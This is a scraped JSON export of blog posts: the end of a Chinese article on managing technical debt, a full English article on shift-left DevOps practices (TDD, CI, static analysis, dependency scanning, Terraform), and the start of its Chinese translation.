$50K 的加班费修复由这笔债务引起的生产事故” “入职成本从每个开发人员 $10K 增加到 $30K” “我们失去了一笔 $200K 的交易，因为我们无法及时交付功能” 客户影响： “客户满意度从 4.5 星下降到 3.2 星” “由于 bug，支持工单增加了 60%” “三个企业客户威胁要离开” 3. 显示趋势 一个数据点是轶事。趋势是危机。 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_078fa00f7')); var option = { \"title\": { \"text\": \"功能交付速度下降\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"xAxis\": { \"type\": \"category\", \"data\": [\"2019 Q1\", \"2019 Q2\", \"2019 Q3\", \"2019 Q4\", \"2020 Q1\", \"2020 Q2\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"交付的功能\" }, \"series\": [{ \"type\": \"line\", \"data\": [15, 14, 12, 9, 7, 5], \"itemStyle\": { \"color\": \"#c62828\" }, \"markLine\": { \"data\": [ { \"type\": \"average\", \"name\": \"平均\" } ] } }] }; chart.setOption(option); } })(); 显示速度下降、事故增加或成本上升的趋势。趋势是不可否认的。 4. 提供带权衡的选项 不要要求解决方案。提供选项： 选项 A：什么都不做 成本：前期 $0 影响：速度继续每季度下降 10% 风险：6 个月内可能发生重大停机 时间表：立即 选项 B：增量偿还（推荐） 成本：6 个月内 20% 的冲刺能力 影响：速度稳定，然后提高 30% 风险：最小，工作与功能同时进行 时间表：6 个月显著改善 选项 C：专门的重构冲刺 成本：2 个冲刺，没有新功能 影响：之后速度立即提高 50% 风险：功能交付暂停 4 周 时间表：1 个月完成 选项 D：完全重写 成本：6-12 个月，整个团队 影响：现代架构，但有新 bug 风险：高——可能需要更长时间，累积新债务 时间表：12 个月以上 让高管根据业务优先级选择。 5. 连接到战略目标 将债务偿还与公司目标对齐： “为了达到我们的 Q4 收入目标，我们需要交付 3 个主要功能。当前债务意味着我们只能交付 1 个。” “董事会希望我们扩展到 100 万用户。我们当前的架构在 10 万用户时就会崩溃。” “我们下个季度要招聘 5 名开发人员。有了当前的债务，他们的入职将花费 $150K 而不是 $50K。” 6. 提议试点 通过从小处开始来降低风险： “让我们花一个冲刺偿还身份验证模块中的债务。我们将衡量对速度和 bug 率的影响。如果有效，我们将扩展到其他领域。” 试点以最小的承诺证明价值。 如何呈现案例 准备一页高管摘要： # 技术债务偿还提案 ## 问题 开发速度在 18 个月内下降了 60%。过去需要 2 周的功能现在需要 5 周。我们错过了承诺并失去了竞争优势。 ## 根本原因 核心模块中累积的技术债务。代码脆弱、测试不足且难以安全修改。 ## 业务影响 - 失去 $300K 交易（无法及时交付功能） - 客户满意度从 4.5 下降到 3.2 - 3 名高级开发人员因代码库挫折而离开 - 生产事故同比增加 80% ## 提议的解决方案 将 6 个月内 20% 的冲刺能力用于债务减少。 ## 预期结果 - 6 个月内速度提高 40% - 生产事故减少 50% - 开发人员满意度提高 - 入职时间从 3 个月减少到 6 周 ## 成本 - 20% 能力 = 每季度少 2 个功能 - 替代方案：继续当前轨迹，12 个月内速度降至零 ## 请求 批准将 20% 的冲刺能力分配给技术债务减少，每月进度审查。 用视觉呈现： graph TB A([当前状态每季度 5 个功能高事故率]) --> B{投资于债务减少?} B -->|否| C([6 个月后每季度 2 个功能危机模式]) B -->|是| D([6 个月后每季度 12 个功能稳定系统]) style A fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#b71c1c,stroke:#000,stroke-width:3px,color:#fff style D fill:#e8f5e9,stroke:#388e3c,stroke-width:3px 预测反对意见： 反对意见：“我们没有时间，我们现在需要功能。” 回应：“我们已经通过更慢的交付支付了时间成本。这项投资可以收回那段时间。” 反对意见：“开发人员不能只是编写更好的代码吗？” 回应：“债务已经存在。我们需要专门的时间来修复它，而不仅仅是避免使它变得更糟。” 反对意见：“我们怎么知道这会有效？” 回应：“让我们在一个模块上运行 2 周的试点并衡量结果。低风险，高学习。” 反对意见：“这听起来很贵。” 回应：“什么都不做更贵。我们每月在失去的交易和事故中损失 $X。这在 Y 个月内就能收回成本。” 建立持续赞助 一旦你获得初步批准，保持赞助： 1. 定期报告进度 每月更新显示： 完成的债务项目 速度改善 事故减少 开发人员满意度分数 2. 庆祝胜利 当债务减少实现业务胜利时，宣传它： “我们在 2 周而不是 6 周内交付了功能 X，因为我们重构了模块 Y” “重构登录系统后，本月零身份验证事故” 3. 使债务可见 创建高管可以检查的仪表板： 技术债务比率趋势下降 速度趋势上升 事故计数趋势下降 测试覆盖率趋势上升 4. 连接到业务结果 始终将技术改进与业务结果联系起来： “更快的交付” → “抢先竞争对手进入市场” “更少的 bug” → “更高的客户满意度” “更好的架构” → “可以扩展到 10 倍用户” 🎬 成功的赞助故事一个开发团队的速度在 2 年内下降了 70%。工程经理准备了一个演示： 呈现的数据： 显示速度下降的图表 错过的承诺和失去的交易列表 计算：债务每年花费 $500K 的生产力损失 提案：6 个月债务减少计划 高管回应： &quot;你为什么不早点告诉我们？这解释了为什么我们错过目标。批准。&quot; 6 个月后的结果： 速度提高 60% 生产事故下降 75% 团队交付了 3 个以前&quot;不可能&quot;的主要功能 工程经理因扭转团队而获得晋升 关键：说业务语言并显示明确的投资回报率。 危险信号：赞助请求何时失败 模糊的抱怨：&quot;代码很乱&quot;得不到预算。&quot;我们每月在事故中损失 $50K&quot;可以。 无数据：没有指标的轶事被视为意见而被驳回。 全有或全无：要求 6 个月没有功能会被拒绝。提议 20% 能力会被批准。 技术术语：高管不关心&quot;紧耦合&quot;。他们关心&quot;无法在不破坏其他功能的情况下添加功能&quot;。 无业务连接：如果你无法解释为什么这对客户或收入很重要，你就不会获得赞助。 💡 黄金法则高管赞助解决业务问题的计划，而不是技术问题。你的工作是将技术债务转化为业务影响。掌握这种转化，你就会获得所需的赞助。 预防技术债务 预防比治疗更容易。建立最小化债务累积的实践： 设计优先方法 预防技术债务最有效的方法之一是在编码前思考。设计优先意味着在编写实现代码之前理解问题、探索解决方案并做出架构决策。 为什么设计优先预防债务： 防止意外债务：当你先设计时，你会在架构不匹配嵌入代码之前捕获它们。你发现你的初始 API 设计不支持未来需求，或者你的数据库模式无法扩展——而这些仍然很容易修复。 减少返工：更改设计文档需要几分钟。重构已实现的代码需要几小时或几天。设计优先将思考前置，减少昂贵的实现更改。 实现更好的决策：设计阶段允许你有意识地评估权衡。你应该使用微服务还是单体？SQL 还是 NoSQL？这些决策一旦实现就很难逆转。 改善沟通：设计文档在团队中创建共同理解。每个人都知道正在构建什么以及为什么，减少创建债务的不一致实现。 捕获需求差距：设计迫使你思考边缘情况、错误处理和集成点。你在编写需要返工的代码之前发现缺失的需求。 graph TB A([📋 需求]) --> B([🎨 设计阶段架构和规划]) B --> C{设计审查} C -->|发现问题| B C -->|批准| D([💻 实现]) D --> E([✅ 匹配设计更少债务]) A2([📋 需求]) --> D2([💻 代码优先无设计]) D2 --> F([🔧 在编码期间发现问题]) F --> G([📈 累积债务需要返工]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px 实用的设计优先实践： 架构决策记录（ADR）：记录重要决策、考虑的替代方案和理由。这可以防止未来的开发人员想知道&quot;他们为什么这样做？&quot; API 设计审查：在实现之前设计和审查 API。模拟它们，用样本数据测试，确保它们满足实际用例。 数据库模式规划：在创建表之前对数据建模。考虑访问模式、关系和未来增长。 概念验证：对于不确定的技术决策，在承诺完整实现之前构建小型原型来验证方法。 设计审查：在编码开始之前让团队成员审查设计。新鲜的视角会捕获你错过的问题。 🎬 设计优先成功故事一个团队正在构建通知系统。他们没有直接跳入代码，而是花了两天设计： 通知如何排队和交付 交付失败时会发生什么 如何处理速率限制 跟踪通知状态的数据库模式 在设计审查期间，他们发现他们的初始方法无法处理所需的规模。他们使用消息队列架构重新设计。 这两天的设计投资防止了数周的重构，如果他们在实现后发现可扩展性问题，就需要这些重构。 何时跳过设计优先： 设计优先并不总是合适的： 探索性工作：当你在实验以理解问题时，代码优先探索可能更快。只需将代码视为一次性的。 充分理解的模式：对于使用既定模式的常规功能，广泛的设计可能是过度的。 原型和 MVP：当快速验证想法时，故意的技术债务可能是可接受的。 关键是有意识。如果你跳过设计，承认你正在产生债务并计划解决它。 💡 轻量级设计设计优先并不意味着数周的 UML 图和正式规范。对于大多数功能，一个简单的文档涵盖： 我们正在解决什么问题？ 我们将采取什么方法？ 关键组件及其交互是什么？ 可能出什么问题？ 这需要 30-60 分钟，可以防止数小时的返工。 代码审查 严格的代码审查在债务进入代码库之前捕获它。审查者应该问： 这段代码可维护吗？ 有测试吗？ 这遵循我们的标准吗？ 有更简单的方法吗？ 自动化质量门 配置 CI/CD 管道以强制执行质量标准： 最低测试覆盖率阈值 复杂性限制 安全漏洞扫描 依赖项新鲜度检查 完成的定义 在你的完成定义中包括质量标准： 代码已审查并批准 测试已编写并通过 文档已更新 没有新的静态分析警告 技术债务登记册 维护已知债务的可见登记册： 债务是什么？ 为什么产生？ 影响是什么？ 解决它的计划是什么？ 这种透明度可以防止债务被遗忘并帮助优先处理工作。 持续学习 投资于团队技能以防止意外债务： 定期培训最佳实践 架构审查 知识分享会议 结对编程 ✨ 建立质量文化最有效的债务预防是文化性的。当团队重视代码质量、为他们的工作感到自豪并有权推回不切实际的截止日期时，债务累积得更慢。质量不是一个阶段——而是一种心态。 未来：AI 辅助债务管理 展望未来，人工智能将改变我们管理技术债务的方式。虽然今天的工具需要人类判断来识别和优先处理债务，但明天的 AI 智能体将主动检测、优先处理甚至自动重构有问题的代码。 想象一个 AI 助手： 持续扫描你的代码库以查找债务指标 根据对开发速度的实际影响优先处理债务 提出重构策略，估计工作量和收益 在非工作时间自动重构低风险债务 学习你团队的编码标准并一致地执行它们 这不是科幻小说——基础今天就存在。随着 AI 编码工具从简单的代码补全发展到能够理解整个代码库的自主智能体，它们将成为对抗技术债务的强大盟友。 关键是平衡自动化与人类判断。AI 可以识别模式并执行重构，但人类必须做出关于优先级、可接受权衡和架构方向的战略决策。 🔮 为 AI 辅助重构做准备要从未来的 AI 工具中受益： 维护全面的测试（AI 需要这些来验证重构安全性） 记录架构决策（AI 需要上下文来做出好的选择） 建立明确的编码标准（AI 需要规则来执行） 建立持续改进的文化（AI 放大现有实践） 结论：债务不可避免，管理至关重要 技术债务不是失败——它是软件开发不可避免的一部分。随着需求变化、技术发展和团队学习更好的方法，每个代码库都会累积债务。 问题不在于你是否会有技术债务。问题是你是否会有意识地管理它，还是让它管理你。 将债务视为战略工具的团队——在有益时有意识地产生它、持续偿还它并防止鲁莽累积——随着时间的推移保持高速度和代码质量。忽视债务的团队发现自己被困在抵制变化、让开发人员沮丧并最终需要昂贵重写的代码库中。 选择权在你手中。你会管理你的债务，还是让你的债务管理你？ 💭 记住&quot;技术债务就像信用卡。明智使用，它会加速进步。鲁莽使用，它会导致破产。关键是知道何时借款并始终有偿还计划。&quot; 实用的下一步 准备好解决代码库中的技术债务了吗？从这里开始： 评估当前状态：运行静态分析工具并审查关键指标以了解你的债务水平 识别痛点：询问你的团队什么代码造成最大挫折并拖慢他们 优先处理：使用影响/工作量矩阵识别首先要解决的高价值债务 分配时间：承诺将每个冲刺的 20% 用于债务减少 衡量进度：跟踪速度、bug 率和开发人员满意度以验证改进 预防新债务：实施代码审查标准和自动化质量门 使其可见：创建债务登记册并在冲刺计划中讨论它 技术债务管理不是一次性项目——而是持续的实践。从小处开始，建立动力，逐步将你的代码库从负担转变为资产。 开始管理技术债务的最佳时间是昨天。第二好的时间是今天。 commentBox('5765834504929280-proj')","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"软件工程","slug":"软件工程","permalink":"https://neo01.com/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"},{"name":"技术债务","slug":"技术债务","permalink":"https://neo01.com/tags/%E6%8A%80%E6%9C%AF%E5%80%BA%E5%8A%A1/"},{"name":"代码质量","slug":"代码质量","permalink":"https://neo01.com/tags/%E4%BB%A3%E7%A0%81%E8%B4%A8%E9%87%8F/"},{"name":"重构","slug":"重构","permalink":"https://neo01.com/tags/%E9%87%8D%E6%9E%84/"}],"lang":"zh-CN"},{"title":"Shift-Left in DevOps: Moving Quality Earlier in the Pipeline","slug":"2020/06/Shift-Left-DevOps-Moving-Quality-Earlier","date":"un55fin55","updated":"un55fin55","comments":true,"path":"2020/06/Shift-Left-DevOps-Moving-Quality-Earlier/","permalink":"https://neo01.com/2020/06/Shift-Left-DevOps-Moving-Quality-Earlier/","excerpt":"Discover how shift-left practices transform software development by catching issues early. Learn the observe-plan-act-reflect cycle that makes quality everyone's responsibility from day one.","text":"Software development has a costly problem: the later you find a bug, the more expensive it is to fix. A bug caught during code review costs minutes. The same bug found in production costs hours of debugging, emergency deployments, and potentially lost revenue or damaged reputation. This reality has driven one of the most important movements in modern DevOps: shift-left. The term “shift-left” refers to moving quality practices earlier in the software development lifecycle - literally shifting them to the left on a timeline diagram. Instead of testing after development is complete, we test during development. Instead of thinking about security before deployment, we think about it during design. This isn’t just about testing earlier. It’s about fundamentally rethinking when and how we ensure quality, and who is responsible for it. The Traditional Approach: Quality as a Gate For decades, software development followed a linear path: graph LR A([📝 Requirements]) --> B([💻 Development]) B --> C([🧪 Testing]) C --> D([🚀 Deployment]) D --> E([⚙️ Operations]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px Developers wrote code. When they finished, they “threw it over the wall” to QA teams who tested it. If bugs were found, code went back to developers. This cycle repeated until quality gates were passed. Problems with This Approach: Slow Feedback: Developers might not see test results for days or weeks. By then, they’ve forgotten the context and moved to other projects. Expensive Fixes: Changing code late in the cycle often requires rework of documentation, tests, and related features. Siloed Responsibility: Developers focused on features, QA focused on quality. Neither owned the complete picture. Limited Coverage: Testing happened in artificial environments that didn’t match production conditions. Bottlenecks: QA teams became bottlenecks as development teams grew faster than testing capacity. The Shift-Left Revolution Shift-left changes the fundamental question from “How do we test this?” to “How do we build quality in from the start?” graph LR A([📝 Requirements+ Test Planning]) --> B([💻 Development+ Unit Tests]) B --> C([🧪 Integration Tests+ Security Scans]) C --> D([🚀 Deployment+ Smoke Tests]) D --> E([⚙️ Operations+ Monitoring]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px Quality practices are integrated into every phase: Requirements Phase: Test scenarios are defined alongside features. Acceptance criteria become automated tests. Development Phase: Developers write unit tests before or alongside code. Static analysis catches issues as code is written. Integration Phase: Automated tests run on every commit. Security scans happen continuously. Deployment Phase: Smoke tests verify critical paths immediately after deployment. Operations Phase: Monitoring provides feedback that informs future development. 💡 The Core PrincipleShift-left isn't about doing more work - it's about doing the right work at the right time. Catching a bug during code review takes minutes. Catching it in production takes hours or days. The Observe-Plan-Act-Reflect Cycle Effective shift-left practices follow a continuous improvement cycle that applies at every level of development: graph LR A([🔍 ObserveCurrent State]) --> B([🎯 PlanImprovements]) B --> C([⚡ ActImplement Changes]) C --> D([💭 ReflectEvaluate Results]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px Observe: Understand the current state of your code, tests, and quality metrics. What’s working? What’s failing? Where are the bottlenecks? Plan: Based on observations, decide what to improve. Should you add more unit tests? Implement static analysis? Improve test coverage? Act: Implement the planned improvements. Write tests, configure tools, update processes. Reflect: Evaluate the results. Did test coverage improve? Are bugs being caught earlier? Is the team moving faster? This cycle repeats continuously, at multiple levels: Individual Developer Level: Observe code quality → Plan refactoring → Act on improvements → Reflect on results Team Level: Observe test coverage → Plan testing strategy → Act on implementation → Reflect on effectiveness Organization Level: Observe quality metrics → Plan process improvements → Act on changes → Reflect on outcomes 🎬 Real-World ExampleA development team observes that integration bugs are frequently found late in the cycle. They plan to implement integration tests that run on every commit. They act by writing tests and configuring CI/CD pipelines. They reflect after two sprints: integration bugs caught early increased by 60%, and late-stage bug fixes decreased by 40%. The cycle continues: they observe that some integration tests are slow, plan to optimize them, act on improvements, and reflect on the results. Key Shift-Left Practices Let’s explore the specific practices that make shift-left effective. 1. Test-Driven Development (TDD) TDD inverts the traditional development process: write tests before writing code. The TDD Cycle: Write a failing test: Define what the code should do Write minimal code: Make the test pass Refactor: Improve code quality while keeping tests green Repeat: Move to the next feature graph LR A([❌ WriteFailing Test]) --> B([✅ MakeTest Pass]) B --> C([🔧 RefactorCode]) C --> A style A fill:#ffebee,stroke:#c62828,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px Benefits: Design Clarity: Writing tests first forces you to think about interfaces and behavior before implementation Complete Coverage: Every line of code has a corresponding test Living Documentation: Tests document how code should behave Confidence: Refactoring is safe because tests catch regressions Example: &#x2F;&#x2F; 1. Write the test first describe(&#39;calculateTotal&#39;, () &#x3D;&gt; &#123; it(&#39;should add tax to subtotal&#39;, () &#x3D;&gt; &#123; const result &#x3D; calculateTotal(100, 0.1); expect(result).toBe(110); &#125;); &#125;); &#x2F;&#x2F; 2. Write minimal code to pass function calculateTotal(subtotal, taxRate) &#123; return subtotal + (subtotal * taxRate); &#125; &#x2F;&#x2F; 3. Refactor if needed function calculateTotal(subtotal, taxRate) &#123; if (subtotal &lt; 0 || taxRate &lt; 0) &#123; throw new Error(&#39;Values must be positive&#39;); &#125; return subtotal * (1 + taxRate); &#125; 2. Continuous Integration (CI) CI automates the process of integrating code changes and running tests. Every commit triggers a build and test cycle. How CI Works: graph TB A([👨‍💻 DeveloperCommits Code]) --> B([🔄 CI ServerDetects Change]) B --> C([🏗️ BuildApplication]) C --> D([🧪 RunTests]) D --> E{All TestsPass?} E -->|Yes| F([✅ MergeApproved]) E -->|No| G([❌ NotifyDeveloper]) G --> A style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px Key Principles: Commit Frequently: Small, frequent commits are easier to debug than large, infrequent ones. Fast Feedback: Tests should run quickly so developers get immediate feedback. Fix Broken Builds Immediately: A broken build is the highest priority - don’t commit more code until it’s fixed. Automate Everything: Build, test, and deployment should require no manual steps. Benefits: Early Detection: Integration issues are caught within minutes of committing code Reduced Risk: Small changes are easier to debug than large merges Team Confidence: Everyone knows the current state of the codebase Faster Development: Automated testing is faster than manual testing 3. Static Code Analysis Static analysis examines code without executing it, catching issues like security vulnerabilities, code smells, and style violations. What Static Analysis Catches: Security Issues: SQL injection vulnerabilities Cross-site scripting (XSS) risks Hardcoded credentials Insecure cryptography Code Quality: Unused variables Dead code Complex functions Duplicate code Style Violations: Inconsistent formatting Naming convention violations Missing documentation Example Tools: SonarQube: Comprehensive code quality platform ESLint: JavaScript linting Pylint: Python code analysis RuboCop: Ruby static analysis Checkmarx: Security-focused scanning Integration into Development: # CI&#x2F;CD Pipeline Example pipeline: - stage: analyze steps: - run: eslint src&#x2F; - run: sonar-scanner - run: security-scan - stage: test steps: - run: npm test - stage: build steps: - run: npm run build ⚠️ Avoid Analysis FatigueToo many warnings can lead to &quot;alert fatigue&quot; where developers ignore all warnings. Configure tools to: Focus on high-severity issues first Gradually increase strictness Customize rules for your team's needs Fix existing issues before enforcing new rules 4. Security Scanning (Shift-Left Security) Security scanning moves security testing from pre-deployment to development time. Types of Security Scanning: Static Application Security Testing (SAST): Analyzes source code for vulnerabilities without executing it. Dependency Scanning: Checks third-party libraries for known vulnerabilities. Secret Detection: Finds accidentally committed credentials, API keys, and tokens. Container Scanning: Analyzes Docker images for security issues. graph TB A([💻 Code Commit]) --> B([🔍 SAST Scan]) B --> C([📦 Dependency Check]) C --> D([🔐 Secret Detection]) D --> E{IssuesFound?} E -->|Yes| F([❌ Block Merge]) E -->|No| G([✅ Continue Pipeline]) style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#ffebee,stroke:#c62828,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Benefits: Early Detection: Security issues found during development, not before deployment Lower Cost: Fixing security issues early is cheaper than fixing them in production Developer Education: Developers learn secure coding practices through immediate feedback Compliance: Automated scanning helps meet regulatory requirements Example: Dependency Scanning &#x2F;&#x2F; package.json &#123; &quot;dependencies&quot;: &#123; &quot;express&quot;: &quot;4.16.0&quot; &#x2F;&#x2F; Known vulnerability! &#125; &#125; # CI pipeline runs dependency check $ npm audit found 1 high severity vulnerability express: &lt;4.16.2 - Denial of Service Run &#96;npm audit fix&#96; to fix them 5. Infrastructure as Code (IaC) IaC treats infrastructure configuration as code, enabling testing and version control of infrastructure. Benefits of IaC: Version Control: Infrastructure changes are tracked like code changes. Testing: Infrastructure can be tested before deployment. Consistency: Same configuration works in dev, staging, and production. Automation: Infrastructure deployment is automated and repeatable. Example: Terraform # Define infrastructure resource &quot;aws_instance&quot; &quot;web&quot; &#123; ami &#x3D; &quot;ami-0c55b159cbfafe1f0&quot; instance_type &#x3D; &quot;t2.micro&quot; tags &#x3D; &#123; Name &#x3D; &quot;WebServer&quot; &#125; &#125; # Test infrastructure configuration resource &quot;aws_security_group&quot; &quot;web&quot; &#123; ingress &#123; from_port &#x3D; 80 to_port &#x3D; 80 protocol &#x3D; &quot;tcp&quot; cidr_blocks &#x3D; [&quot;0.0.0.0&#x2F;0&quot;] &#125; &#125; Testing IaC: # Validate syntax terraform validate # Check for security issues tfsec . # Preview changes terraform plan # Apply changes terraform apply 6. Automated Testing Pyramid The testing pyramid guides how to distribute testing efforts across different levels. graph TB A[🔺 Testing Pyramid] B[E2E TestsFew, Slow, Expensive] C[Integration TestsSome, Medium Speed] D[Unit TestsMany, Fast, Cheap] A --> B B --> C C --> D style B fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Unit Tests (Base): Test individual functions or classes Fast execution (milliseconds) High coverage (70-80% of tests) Run on every commit Integration Tests (Middle): Test interactions between components Medium execution time (seconds) Moderate coverage (15-25% of tests) Run on every commit or merge End-to-End Tests (Top): Test complete user workflows Slow execution (minutes) Limited coverage (5-10% of tests) Run before deployment 💡 The Right BalanceToo many E2E tests: Slow feedback, brittle tests, high maintenance Too few unit tests: Issues caught late, expensive debugging Just right: Fast unit tests catch most issues, integration tests verify interactions, E2E tests validate critical paths Implementing Shift-Left: A Practical Roadmap Ready to implement shift-left practices? Here’s a step-by-step approach. Phase 1: Foundation (Weeks 1-4) Set Up CI/CD Pipeline: Choose a CI platform (Jenkins, GitLab CI, GitHub Actions) Configure automated builds on every commit Set up basic test execution Establish build status notifications Start with Unit Tests: Identify critical business logic Write unit tests for new code Gradually add tests for existing code Aim for 60% coverage initially Establish Code Review Process: Require peer review before merging Create review checklists Focus on readability and maintainability Share knowledge across the team Phase 2: Quality Gates (Weeks 5-8) Add Static Analysis: Configure linting tools Start with warnings, not errors Gradually increase strictness Fix issues in new code first Implement Security Scanning: Add dependency vulnerability scanning Configure secret detection Set up automated alerts Create remediation process Expand Test Coverage: Add integration tests for critical paths Increase unit test coverage to 70% Create test data management strategy Document testing standards Phase 3: Advanced Practices (Weeks 9-12) Adopt TDD: Train team on TDD practices Start with new features Pair programming to spread knowledge Measure impact on bug rates Infrastructure as Code: Define infrastructure in code Version control all configurations Test infrastructure changes Automate deployment Performance Testing: Add performance tests to CI Establish performance baselines Monitor performance trends Alert on regressions Phase 4: Continuous Improvement (Ongoing) Measure and Optimize: Track key metrics (test coverage, bug rates, build times) Identify bottlenecks Optimize slow tests Refine processes based on data Team Culture: Celebrate quality improvements Share learnings across teams Encourage experimentation Make quality everyone’s responsibility 🎯 Success MetricsTrack these metrics to measure shift-left effectiveness: Defect Detection Rate: Percentage of bugs caught before production Test Coverage: Percentage of code covered by tests Build Time: Time from commit to test results Mean Time to Fix: Average time to resolve bugs Deployment Frequency: How often you can safely deploy Shift-left practices should improve all of these over time. Common Challenges and Solutions Implementing shift-left isn’t without challenges. Here’s how to address common obstacles. Challenge 1: “We Don’t Have Time to Write Tests” Reality: You don’t have time NOT to write tests. Debugging production issues takes far longer than writing tests. Solution: Start small with critical paths Measure time saved from early bug detection Make testing part of “done” definition Automate test execution to save time Challenge 2: “Our Codebase is Too Large” Reality: Large codebases benefit most from shift-left practices. Solution: Don’t try to test everything at once Focus on new code and critical paths Gradually expand coverage Use code coverage tools to identify gaps Challenge 3: “Tests Are Too Slow” Reality: Slow tests defeat the purpose of fast feedback. Solution: Optimize slow tests Run unit tests on every commit, integration tests on merge Parallelize test execution Use test impact analysis to run only affected tests Challenge 4: “Developers Resist Change” Reality: Change is difficult, especially when it requires new skills. Solution: Provide training and support Start with volunteers and early adopters Share success stories Make tools easy to use Celebrate improvements Challenge 5: “Too Many False Positives” Reality: Alert fatigue causes developers to ignore all warnings. Solution: Tune tools to reduce noise Start with high-severity issues only Gradually increase strictness Customize rules for your context Fix issues promptly to maintain credibility The Cultural Shift Shift-left is as much about culture as it is about tools and practices. It requires fundamental changes in how teams think about quality. From “QA’s Job” to “Everyone’s Job”: Quality is no longer the responsibility of a separate QA team. Every developer is responsible for the quality of their code. From “Testing Phase” to “Continuous Testing”: Testing isn’t a phase that happens after development. It’s a continuous activity integrated into every step. From “Finding Bugs” to “Preventing Bugs”: The goal isn’t to find bugs efficiently - it’s to prevent them from being written in the first place. From “Blame” to “Learning”: When bugs occur, the focus is on learning and improving processes, not finding who to blame. ✨ Signs of Successful Shift-Left Culture Developers write tests without being asked Code reviews focus on quality, not just functionality Teams celebrate catching bugs early Failed builds are fixed immediately Quality metrics improve over time Deployment confidence increases Production incidents decrease Conclusion: Quality as a First-Class Citizen Shift-left represents a fundamental transformation in how we build software. By moving quality practices earlier in the development lifecycle, we catch issues when they’re cheapest to fix, reduce risk, and accelerate delivery. The observe-plan-act-reflect cycle provides a framework for continuous improvement at every level - from individual developers to entire organizations. Each iteration makes the system better, creating a virtuous cycle of quality improvement. But shift-left isn’t just about tools and processes. It’s about culture. It’s about making quality everyone’s responsibility from day one. It’s about building systems that are designed for quality, not just tested for it. The organizations that embrace shift-left don’t just ship faster - they ship better. They spend less time firefighting production issues and more time building new features. They have confidence in their deployments because quality is built in, not bolted on. The question isn’t whether to shift left. It’s how quickly you can start. 💭 Final Thought&quot;Quality is not an act, it is a habit.&quot; - Aristotle Shift-left makes quality a habit by integrating it into every step of development. The result isn't just better software - it's better teams, better processes, and better outcomes.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"},{"name":"Quality","slug":"Quality","permalink":"https://neo01.com/tags/Quality/"}],"lang":"en"},{"title":"DevOps 中的左移：在流水线中更早地引入质量","slug":"2020/06/Shift-Left-DevOps-Moving-Quality-Earlier-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/06/Shift-Left-DevOps-Moving-Quality-Earlier/","permalink":"https://neo01.com/zh-CN/2020/06/Shift-Left-DevOps-Moving-Quality-Earlier/","excerpt":"探索左移实践如何通过尽早发现问题来改变软件开发。了解观察-计划-行动-反思循环，让质量从第一天起就成为每个人的责任。","text":"软件开发有一个代价高昂的问题：发现 bug 的时间越晚，修复成本就越高。在代码审查期间发现的 bug 只需几分钟就能修复。而在生产环境中发现的同一个 bug 则需要数小时的调试、紧急部署，并可能导致收入损失或声誉受损。 这一现实推动了现代 DevOps 中最重要的运动之一：左移。 &quot;左移&quot;一词指的是在软件开发生命周期中更早地引入质量实践——从字面上看，就是在时间线图上将它们向左移动。我们不是在开发完成后进行测试，而是在开发过程中进行测试。我们不是在部署前才考虑安全性，而是在设计阶段就考虑它。 这不仅仅是更早地进行测试。它从根本上重新思考我们何时以及如何确保质量，以及谁对此负责。 传统方法：质量作为关卡 几十年来，软件开发遵循线性路径： graph LR A([📝 需求]) --> B([💻 开发]) B --> C([🧪 测试]) C --> D([🚀 部署]) D --> E([⚙️ 运维]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px 开发人员编写代码。完成后，他们将代码&quot;扔过墙&quot;给 QA 团队进行测试。如果发现 bug，代码会返回给开发人员。这个循环不断重复，直到通过质量关卡。 这种方法的问题： 反馈缓慢：开发人员可能需要数天或数周才能看到测试结果。到那时，他们已经忘记了上下文并转向其他项目。 修复成本高：在周期后期更改代码通常需要重新编写文档、测试和相关功能。 责任孤立：开发人员专注于功能，QA 专注于质量。双方都没有掌握完整的全局。 覆盖范围有限：测试发生在与生产条件不匹配的人工环境中。 瓶颈：随着开发团队的增长速度快于测试能力，QA 团队成为瓶颈。 左移革命 左移改变了根本问题，从&quot;我们如何测试这个？“变为&quot;我们如何从一开始就构建质量？” graph LR A([📝 需求+ 测试计划]) --> B([💻 开发+ 单元测试]) B --> C([🧪 集成测试+ 安全扫描]) C --> D([🚀 部署+ 冒烟测试]) D --> E([⚙️ 运维+ 监控]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px 质量实践被整合到每个阶段： 需求阶段：测试场景与功能一起定义。验收标准成为自动化测试。 